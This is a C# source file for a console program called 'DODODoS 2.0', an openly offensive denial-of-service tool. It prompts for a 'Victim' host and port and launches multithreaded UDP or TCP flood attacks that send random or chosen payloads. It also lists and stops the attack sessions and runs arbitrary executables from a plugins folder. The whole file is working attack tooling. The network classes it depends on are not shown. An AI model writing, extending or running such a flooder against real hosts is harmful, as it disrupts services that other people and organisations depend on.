using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Chat;
using System.Net.Sockets;

namespace DODODoS
{
    class Program
    {
        static Dictionary<String, Action> cmd;
        static List<Tuple<string, UDP>> UdpVictims = new List<Tuple<string, UDP>>();
        static List<Tuple<string, TCP>> TcpVictims = new List<Tuple<string, TCP>>();
        static string pluginPath = "plugins";

        static object toLockSyncThread = new object();
        static object toLockSyncHiddenNot = new object();
        static object toLockChat = new object();

        static void Main(string[] args)
        {
            //Console.CancelKeyPress += Console_CancelKeyPress;
            bool exit = true;
            //CreateFakeConsole();
            LoadCommands();
            Help();

            while (exit)
            {
                lock (toLockSyncHiddenNot) { Console.Write("DODODoS> "); } //This will leave the thread in a holded state as if it has been paused when the ddos is hidden
                string command = Console.ReadLine(); //Control+C will leave a null string resulting in Argument Exception
                if (command != null && cmd.ContainsKey(command)) //No argument Exception cause the first check is on the null
                    cmd[command]();
                else if (command != null) //No Control-C
                    Console.WriteLine("Unknown command");
            }
        }

        /// <summary>
        /// Loads the commands in the dictionary
        /// </summary>
        static void LoadCommands()
        {
            #region <USELESS CODE>
            ConsoleColor tmp = Console.ForegroundColor;
            Console.ForegroundColor = Console.BackgroundColor;
            Console.BackgroundColor = tmp;
            Console.WriteLine("Welcome to DODODoS 2.0");
            GetLocalIP();
            Console.BackgroundColor = Console.ForegroundColor;
            Console.ForegroundColor = tmp;
            #endregion
            cmd = new Dictionary<string, Action>();
            cmd.Add("udp", new Action(UDP));
            cmd.Add("tcp", new Action(TCP));
            cmd.Add("ip", new Action(GetLocalIP));
            cmd.Add("stop", new Action(Stop));
            cmd.Add("list", new Action(List));

            foreach (string plugin in Directory.GetFiles(pluginPath))
            {
                cmd.Add(Path.GetFileNameWithoutExtension(plugin), new Action(() => PlgExec(plugin)));
            }

            cmd.Add("clear", new Action(Clear));
            cmd.Add("help", new Action(Help));
            cmd.Add("exit", new Action(Exit));

        }

        /// <summary>
        /// Prints the local IP address
        /// </summary>
        static void GetLocalIP()
        {
            string IP4Address = String.Empty;

            foreach (IPAddress IPA in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (IPA.AddressFamily == AddressFamily.InterNetwork)
                {
                    IP4Address = IPA.ToString();
                    break;
                }
            }

            Console.WriteLine("My IP: " + IP4Address);
        }

        /// <summary>
        /// Exits the program
        /// </summary>
        static void Exit()
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// Clears the console
        /// </summary>
        static void Clear()
        {
            Console.Clear();
        }

        /// <summary>
        /// Prints the list of commands
        /// </summary>
        static void Help()
        {
            Console.WriteLine("Available commands:");
            foreach (string s in cmd.Keys)
            {
                Console.WriteLine("  " + s);
            }
        }

        /// <summary>
        /// Lists all current attacks
        /// </summary>
        static void List()
        {
            int count = 0;
            if (UdpVictims.Count > 0)
            {
                Console.WriteLine("UDP sessions:");
                for (; count < UdpVictims.Count; count++)
                    Console.WriteLine(" {0}.  {1}", count, UdpVictims[count].Item1);
            }
            else
                Console.WriteLine("No UDP sessions.");

            if (TcpVictims.Count > 0)
            {
                Console.WriteLine("TCP sessions:");
                for (int i = 0; i < TcpVictims.Count; count++, i++)
                    Console.WriteLine(" {0}.  {1}", count, TcpVictims[i].Item1);
            }
            else
                Console.WriteLine("No TCP sessions.");
        }

        /// <summary>
        /// Starts a UDP attack
        /// </summary>
        static void UDP()
        {
            string host;
            int port;
            byte[] message;
            Collect(out host, out port, out message);
            Console.WriteLine("Attacking...");

            UdpVictims.Insert(0, new Tuple<string, UDP>(host + ":" + port, new UDP()));
            UdpVictims[0].Item2.Connect(host, port);
            UdpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
        }

        /// <summary>
        /// Starts a TCP attack
        /// </summary>
        static void TCP()
        {
            string host;
            int port;
            byte[] message;
            TCP t;
            Collect(out host, out port, out message);
            Console.WriteLine("Attacking...");

            t = new TCP();
            bool conn = t.Connect(host, port);

            for (int i = 0; i < 5 && !conn; i++)
            {
                Console.WriteLine("Can't connect. Retrying...");
                conn = t.Connect(host, port);
            }
            if (conn)
            {
                TcpVictims.Insert(0, new Tuple<string, TCP>(host + ":" + port, t));
                TcpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
            }
        }

        /// <summary>
        /// Stops all running attacks
        /// </summary>
        static void Stop()
        {
            Console.WriteLine("Wich session do you want to stop?");
            List();
            Console.Write("[All]> ");
            int n = -1;
            try
            {
                n = Convert.ToInt32(Console.ReadLine());
            }
            catch
            {
            }
            if (n == -1)
            {
                foreach (Tuple<string, UDP> victim in UdpVictims)
                    victim.Item2.Stop();
                foreach (Tuple<string, TCP> victim in TcpVictims)
                    victim.Item2.Stop();
                UdpVictims.Clear();
                TcpVictims.Clear();
            }
            else
            {
                if (n > UdpVictims.Count - 1)
                {
                    TcpVictims[n - (UdpVictims.Count)].Item2.Stop();
                    TcpVictims.RemoveAt(n - (UdpVictims.Count));
                }
                else
                {
                    UdpVictims[n].Item2.Stop();
                    UdpVictims.RemoveAt(n);
                }
            }
            Console.WriteLine("Session(s) stopped succesfully.");
        }

        /// <summary>
        /// Collects the input from the user
        /// </summary>
        /// <param name="host">The host name or ip of the victim</param>
        /// <param name="port">The port of the victim</param>
        /// <param name="message">the message to send</param>
        static void Collect(out string host, out int port, out byte[] message)
        {
            Console.Write("Victim: ");
            host = Console.ReadLine();
            Console.Write("Port: ");
            port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Random string or message? [R/M]: ");
            if (Console.ReadLine() == "r")
            {
                Console.Write("String lenght [Bytes]: ");
                message = Generate(Convert.ToInt32(Console.ReadLine()));
            }
            else
            {
                Console.Write("Message: ");
                message = Encoding.ASCII.GetBytes(Console.ReadLine());
            }
        }

        /// <summary>
        /// Generates a random byte array
        /// </summary>
        /// <param name="lenght">The lenght in bytes of the array to be generated</param>
        /// <returns>The array</returns>
        static byte[] Generate(int lenght)
        {
            byte[] b = new byte[lenght];
            for (int i = 0; i < lenght; i++)
                b[i] = Convert.ToByte(new Random().Next(255));
            return b;
        }

        static bool PlgExec(string name)
        {
            Process plg = new Process();
            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = name,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
            };
            plg.StartInfo = psi;
            plg.Start();
            while (!plg.StandardOutput.EndOfStream)
                while (!plg.StandardOutput.EndOfStream)
                {
                    Console.WriteLine(plg.StandardOutput.ReadLine());
                }
            plg.StandardInput.WriteLine(Console.ReadLine());
            return true;
        }
    }
}
